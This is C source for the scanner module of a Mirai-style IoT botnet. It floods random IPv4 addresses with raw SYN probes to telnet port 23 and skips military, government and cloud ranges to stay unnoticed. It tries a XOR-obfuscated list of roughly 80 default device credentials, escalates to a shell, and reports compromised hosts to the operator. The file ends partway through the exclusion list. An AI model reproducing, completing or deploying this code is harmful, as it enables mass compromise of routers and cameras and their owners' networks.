#ifdef SCANNER
#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "headers/includes.h"
#include "headers/scanner.h"
#include "headers/xor.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/checksum.h"

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void rep_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    // Setup Passwords
    add_auth_entry("\x07\x1A\x1A\x01", "\x01\x10\x19\x10\x16\x1A\x18\x14\x11\x18\x1C\x1B\x75", 16); // root:telecomadmin
    add_auth_entry("\x07\x1A\x1A\x01", "\x0F\x1D\x1A\x1B\x12\x0D\x1C\x1B\x12\x75", 13); // root:zhongxing
    add_auth_entry("\x07\x1A\x1A\x01", "\x44\x45\x45\x44\x16\x1D\x1C\x1B\x75", 12); // root:1001chin
    add_auth_entry("\x07\x1A\x1A\x01", "\x12\x07\x1A\x00\x01\x10\x07\x75", 11); // root:grouter
    add_auth_entry("\x07\x1A\x1A\x01", "\x1F\x03\x17\x0F\x11\x75", 9); // root:jvbzd
    add_auth_entry("\x07\x1A\x1A\x01", "\x1D\x12\x47\x0D\x45\x75", 9); // root:hg2x0
    add_auth_entry("\x07\x1A\x1A\x01", "\x01\x10\x19\x1B\x10\x01\x75", 10); // root:telnet
    add_auth_entry("\x07\x1A\x1A\x01", "\x3C\x25\x36\x14\x18\x35\x06\x02\x75", 12); // root:IPCam@sw
    add_auth_entry("\x07\x1A\x1A\x01", "\x1F\x00\x14\x1B\x01\x10\x16\x1D\x75", 12); // root:juantech
    add_auth_entry("\x07\x1A\x1A\x01", "\x32\x38\x4D\x44\x4D\x47\x75", 10); // root:GM8182
    add_auth_entry("\x11\x14\x10\x18\x1A\x1B\x75", "\x11\x14\x10\x18\x1A\x1B\x75", 12); // daemon:daemon
    add_auth_entry("\x14\x11\x18\x1C\x1B\x75", "\x47\x43\x45\x44\x1D\x0D\x75", 11); // admin:2601hx
    add_auth_entry("\x17\x1C\x1B\x75", "", 3); // bin:
    add_auth_entry("\x07\x1A\x1A\x01", "\x01\x06\x12\x1A\x1C\x1B\x12\x1A\x1B\x75", 13); // root:tsgoingon
    add_auth_entry("\x12\x00\x10\x06\x01", "\x44\x44\x44\x44\x75", 9); // guest:1111
    add_auth_entry("\x14\x11\x18\x1C\x1B\x75", "\x06\x10\x07\x03\x1C\x16\x10\x75", 12); // admin:service
    add_auth_entry("\x06\x00\x05\x05\x1A\x07\x01\x75", "\x44\x47\x46\x41\x75", 11); // support:1234
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x07\x10\x14\x19\x01\x10\x1E\x75", 11); // root:realtek
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x0D\x18\x1D\x11\x1C\x05\x16\x75", 11); // root:xmhdipc
    add_auth_entry("\x01\x10\x19\x16\x1A\x75", "\x01\x10\x19\x16\x1A\x75", 10); // telco:telco
    add_auth_entry("\x34\x11\x18\x1C\x1B", "\x44\x4C\x4D\x4D\x75", 9); // Admin:1988
    add_auth_entry("", "\x05\x14\x06\x06\x02\x1A\x07\x11\x75", 8); // :password
    add_auth_entry("\x34\x11\x18\x1C\x1B", "\x34\x11\x18\x1C\x1B", 10); // Admin:Admin
    add_auth_entry("", "\x16\x1A\x1B\x1B\x10\x16\x01\x75", 7); // :connect
    add_auth_entry("\x14\x11\x18\x1C\x1B", "\x13\x1C\x07\x10\x01\x1C\x11\x10\x75", 13); // admin:firetide
    add_auth_entry("\x16\x1C\x06\x16\x1A\x75", "\x16\x1C\x06\x16\x1A\x75", 10); // cisco:cisco
    add_auth_entry("\x44\x47\x46\x41\x75", "\x16\x1A\x18\x16\x14\x06\x01\x75", 11); // 1234:comcast
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x06\x06\x1D\x75", 7); // root:ssh
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x27\x1A\x1A\x01\x75", 8); // root:Root
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x27\x3A\x3A\x21\x75", 8); // root:ROOT
    add_auth_entry("", "", 0); // :
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x11\x07\x1A\x05\x05\x10\x07\x75", 11); // root:dropper
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x17\x10\x14\x07\x11\x07\x1A\x05\x05\x10\x07\x75", 15); // root:beardropper
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x07\x14\x06\x17\x10\x07\x07\x0C\x05\x1C\x10\x75", 15); // root:rasberrypie
    add_auth_entry("\x14\x11\x18\x1C\x1B", "\x07\x1A\x1A\x01\x75", 9); // admin:root
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x40\x45\x45\x75", 7); // root:500
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x01\x1A\x1A\x07\x75", 8); // root:toor
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x1C\x05\x16\x14\x18\x75", 9); // root:ipcam
    add_auth_entry("\x07\x1A\x1A\x01\x75", "\x40\x75", 5); // root:5
    add_auth_entry("\x11\x10\x13\x14\x00\x19\x01", "\x3A\x0D\x1D\x19\x02\x26\x32\x4D", 15); // default:OxhlwSG8
    add_auth_entry("\x11\x10\x13\x14\x00\x19\x01", "\x01\x19\x3F\x02\x05\x17\x1A\x43", 15); // default:tlJwpbo6
    add_auth_entry("\x11\x10\x13\x14\x00\x19\x01", "\x26\x47\x13\x32\x04\x3B\x33\x06", 15); // default:S2fGqNFs
    add_auth_entry("\x14\x11\x18\x1C\x1B", "\x14\x11\x18\x1C\x1B", 10); // admin:admin
    add_auth_entry("\x11\x10\x13\x14\x00\x19\x01", "\x11\x10\x13\x14\x00\x19\x01", 14); // default:default
    add_auth_entry("\x07\x1A\x1A\x01", "\x07\x1A\x1A\x01", 8); // root:root
    add_auth_entry("\x06\x00\x05\x05\x1A\x07\x01", "\x06\x00\x05\x05\x1A\x07\x01", 14); // support:support
    add_auth_entry("\x07\x1A\x1A\x01", "", 4); // root:
    add_auth_entry("\x34\x11\x18\x1C\x1B", "", 5); // Admin:
    add_auth_entry("\x14\x11\x18\x1C\x1B", "\x44\x47\x46\x41", 9); // admin:1234
    add_auth_entry("\x14\x11\x18\x1C\x1B", "", 5); // admin:
    add_auth_entry("\x07\x1A\x1A\x01", "\x0D\x16\x46\x40\x44\x44", 10); // root:xc3511
    add_auth_entry("\x07\x1A\x1A\x01", "\x03\x1C\x0F\x0D\x03", 9); // root:vizxv
    add_auth_entry("\x07\x1A\x1A\x01", "\x14\x11\x18\x1C\x1B", 9); // root:admin
    add_auth_entry("\x00\x06\x10\x07", "\x00\x06\x10\x07", 8); // user:user
    add_auth_entry("\x07\x1A\x1A\x01", "\x40\x00\x05", 7); // root:5up
    add_auth_entry("\x11\x10\x13\x14\x00\x19\x01", "", 7); // default:
    add_auth_entry("\x07\x1A\x1A\x01", "\x11\x10\x13\x14\x00\x19\x01", 11); // root:default
    add_auth_entry("\x07\x1A\x1A\x01", "\x44\x47\x46\x41\x40", 9); // root:12345
    add_auth_entry("\x07\x1A\x1A\x01", "\x44\x47\x46\x41", 8); // root:1234
    add_auth_entry("\x07\x1A\x1A\x01", "\x2F\x01\x10\x40\x47\x44", 10); // root:Zte521
    add_auth_entry("\x07\x1A\x1A\x01", "\x1D\x1C\x46\x40\x44\x4D", 10); // root:hi3518
    add_auth_entry("\x12\x00\x10\x06\x01", "\x44\x47\x46\x41\x40", 10); // guest:12345
    add_auth_entry("\x00\x06\x10\x07", "\x00\x06\x10\x07", 8); // user:user
    add_auth_entry("\x07\x1A\x1A\x01", "\x1A\x10\x19\x1C\x1B\x00\x0D\x44\x47\x46", 14); // root:oelinux123
    add_auth_entry("\x01\x10\x19\x1B\x10\x01\x14\x11\x18\x1C\x1B", "\x01\x10\x19\x1B\x10\x01\x14\x11\x18\x1C\x1B", 22); // telnetadmin:telnetadmin
    add_auth_entry("\x14\x11\x18\x1C\x1B", "\x14\x11\x18\x1C\x1B\x44\x47\x46", 13); // admin:admin123
    add_auth_entry("\x07\x1A\x1A\x01", "\x1C\x05\x16\x14\x18\x2A\x07\x01\x40\x46\x40\x45", 16); // root:ipcam_rt5350
    add_auth_entry("\x26\x3B\x3B\x20", "\x22\x3D\x2E\x2C\x22", 9); // root:vizxv
    add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x1B\x2C\x3C\x38\x23\x07\x13\x6C", 15);     // default:OxhlwSG8
    add_auth_entry("\x26\x3B\x3B\x20", "\x67\x31\x24\x61\x23\x66\x21", 11); // root:3ep5w2u
    add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x38\x1E\x23\x24\x36\x3B\x62", 14);         // default:lJwpbo6
    add_auth_entry("\x33\x21\x31\x27\x20", "\x65\x66\x67\x60\x61", 10); // guest:12345
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10); // root:xc3511
    add_auth_entry("\x07\x1A\x1A\x01", "\x01\x45\x01\x14\x19\x16\x45\x1B\x01\x07\x45\x19\x41\x54\x75", 18); // root:t0talc0ntr0l4!
    add_auth_entry("\x07\x1A\x1A\x01", "\x42\x00\x1F\x38\x1E\x1A\x45\x14\x11\x18\x1C\x1B\x75", 16); // root:7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 16); // root:7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 12); // root:dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 10); // root:888888
    
    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
                tcph->dest = htons(23);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 28)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 28)

                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                table_unlock_val(XOR_SCAN_ENABLE);
                                tmp_str = table_retrieve_val(XOR_SCAN_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(XOR_SCAN_ENABLE);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                table_unlock_val(XOR_SCAN_SYSTEM);
                                tmp_str = table_retrieve_val(XOR_SCAN_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(XOR_SCAN_SYSTEM);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
                        case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                table_unlock_val(XOR_SCAN_LINUXSHELL);
                                tmp_str = table_retrieve_val(XOR_SCAN_LINUXSHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(XOR_SCAN_LINUXSHELL);

                                conn->state = SC_WAITING_LINUXSHELL_RESP;
                            }
                            break;
                        case SC_WAITING_LINUXSHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                table_unlock_val(XOR_SCAN_BAH);
                                tmp_str = table_retrieve_val(XOR_SCAN_BAH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(XOR_SCAN_BAH);

                                conn->state = SC_WAITING_BAH_RESP;
                            }
                            break;
                        case SC_WAITING_BAH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                table_unlock_val(XOR_SCAN_SHELL);
                                tmp_str = table_retrieve_val(XOR_SCAN_SHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(XOR_SCAN_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                table_unlock_val(XOR_SCAN_SH);
                                tmp_str = table_retrieve_val(XOR_SCAN_SH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(XOR_SCAN_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                // Send query string
                                table_unlock_val(XOR_SCAN_QUERY);
                                tmp_str = table_retrieve_val(XOR_SCAN_QUERY, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(XOR_SCAN_QUERY);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) >= 28)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                                        //Loopback
          (o1 == 0) ||                                         //Invalid address space
          (o1 == 3) ||                                         //General Electric Company
          (o1 == 15 || o2 == 16) ||                            //Hewlett-Packard Company
          (o1 == 56) ||                                        //US Postal Service
          (o1 == 10) ||                                        //Internal network
          (o1 == 25) ||                                        //Some more
          (o1 == 49) ||                                        //Some more
          (o1 == 50) ||                                        //Some more
          (o1 == 137) ||                                       //Some more
          (o1 == 6) ||                                         //Department of Defense
          (o1 == 7) ||                                         //Department of Defense
          (o1 == 11) ||                                        //Department of Defense
          (o1 == 21) ||                                        //Department of Defense
          (o1 == 22) ||                                        //Department of Defense
          (o1 == 26) ||                                        //Department of Defense
          (o1 == 28) ||                                        //Department of Defense
          (o1 == 29) ||                                        //Department of Defense
          (o1 == 30) ||                                        //Department of Defense
          (o1 == 33) ||                                        //Department of Defense
          (o1 == 55) ||                                        //Department of Defense
          (o1 == 214) ||                                       //Department of Defense
          (o1 == 215) ||                                       //Department of Defense
          (o1 == 192 && o2 == 168) ||                          //Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||                //Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||               //IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                           //IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||                //IANA Special use
          (o1 == 147 && o2 >= 35 && o2 < 43) ||                //Some more
          (o1 == 147 && o2 >= 103 && o2 < 105) ||              //Some more
          (o1 == 147 && o2 >= 168 && o2 < 170) ||              //Some more
          (o1 == 147 && o2 >= 198 && o2 < 200) ||              //Some more
          (o1 == 147 && o2 >= 238 && o2 < 255) ||              //Some more
          (o1 == 150 && o2 >= 113 && o2 < 115) ||              //Some more
          (o1 == 152 && o2 >= 151 && o2 < 155) ||              //Some more
          (o1 == 153 && o2 >= 21 && o2 < 32) ||                //Some more
          (o1 == 155 && o2 >= 5 && o2 < 10) ||                 //Some more
          (o1 == 155 && o2 >= 74 && o2 < 89) ||                //Some more
          (o1 == 155 && o2 >= 213 && o2 < 222) ||              //Some more
          (o1 == 157 && o2 >= 150 && o2 < 154) ||              //Some more
          (o1 == 158 && o2 >= 1 && o2 < 21) ||                 //Some more
          (o1 == 158 && o2 >= 235 && o2 < 247) ||              //Some more
          (o1 == 159 && o2 >= 120 && o2 < 121) ||              //Some more
          (o1 == 160 && o2 >= 132 && o2 < 151) ||              //Some more
          (o1 == 64 && o2 >= 224 && o2 < 227) ||               //Some more
          (o1 == 162 && o2 >= 45 && o2 < 47) ||                //CIA 
          (o1 == 163 && o2 >= 205 && o2 < 207) ||              //NASA Kennedy Space Center
          (o1 == 164 && o2 >= 45 && o2 < 50) ||                //NASA Kennedy Space Center
          (o1 == 164 && o2 >= 217 && o2 < 233) ||              //NASA Kennedy Space Center
          (o1 == 169 && o2 >= 252 && o2 < 254) ||              //U.S. Department of State
          (o1 == 199 && o2 >= 121 && o2 < 254) ||              //Naval Air Systems Command, VA
          (o1 == 205 && o2 >= 1 && o2 < 118) ||                //Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
          (o1 == 207 && o2 >= 60 && o2 < 62) ||                //FBI controlled Linux servers & IPs/IP-Ranges
          (o1 == 104 && o2 >= 16 && o2 < 31) ||                //Cloudflare
          (o1 == 188 && o2 == 166) ||                          //Digital Ocean
          (o1 == 188 && o2 == 226) ||                          //Digital Ocean
          (o1 == 159 && o2 == 203) ||                          //Digital Ocean
          (o1 == 162 && o2 == 243) ||                          //Digital Ocean
          (o1 == 45 && o2 == 55) ||                            //Digital Ocean
          (o1 == 178 && o2 == 62) ||                           //Digital Ocean
          (o1 == 104 && o2 == 131) ||                          //Digital Ocean
          (o1 == 104 && o2 == 236) ||                          //Digital Ocean
          (o1 == 107 && o2 == 170) ||                          //Digital Ocean
          (o1 == 138 && o2 == 197) ||                          //Digital Ocean
          (o1 == 138 && o2 == 68) ||                           //Digital Ocean
          (o1 == 139 && o2 == 59) ||                           //Digital Ocean
          (o1 == 146 && o2 == 185 && o3 >= 128 && o3 < 191) || //Digital Ocean
          (o1 == 163 && o2 == 47 && o3 >= 10 && o3 < 11) ||    //Digital Ocean
          (o1 == 174 && o2 == 138 && o3 >= 1 && o3 < 127) ||   //Digital Ocean
          (o1 == 192 && o2 == 241 && o3 >= 128 && o3 < 255) || //Digital Ocean
          (o1 == 198 && o2 == 199 && o3 >= 64 && o3 < 127) ||  //Digital Ocean
          (o1 == 198 && o2 == 211 && o3 >= 96 && o3 < 127) ||  //Digital Ocean
          (o1 == 207 && o2 == 154 && o3 >= 192 && o3 < 255) || //Digital Ocean
          (o1 == 37 && o2 == 139 && o3 >= 1 && o3 < 31) ||     //Digital Ocean
          (o1 == 67 && o2 == 207 && o3 >= 64 && o3 < 95) ||    //Digital Ocean
          (o1 == 67 && o2 == 205 && o3 >= 128 && o3 < 191) ||  //Digital Ocean
          (o1 == 80 && o2 == 240 && o3 >= 128 && o3 < 143) ||  //Digital Ocean
          (o1 == 82 && o2 == 196 && o3 >= 1 && o3 < 15) ||     //Digital Ocean
          (o1 == 95 && o2 == 85 && o3 >= 8 && o3 < 63) ||      //Digital Ocean
          (o1 == 64 && o2 == 237 && o3 >= 32 && o3 < 43) ||    //Choopa & Vultr
          (o1 == 185 && o2 == 92 && o3 >= 220 && o3 < 223) ||  //Choopa & Vultr
          (o1 == 104 && o2 == 238 && o3 >= 128 && o3 < 191) || //Choopa & Vultr
          (o1 == 209 && o2 == 222 && o3 >= 1 && o3 < 31) ||    //Choopa & Vultr
          (o1 == 208 && o2 == 167 && o3 >= 232 && o3 < 252) || //Choopa & Vultr
          (o1 == 66 && o2 == 55 && o3 >= 128 && o3 < 159) ||   //Choopa & Vultr
          (o1 == 45 && o2 == 63 && o3 >= 1 && o3 < 127) ||     //Choopa & Vultr
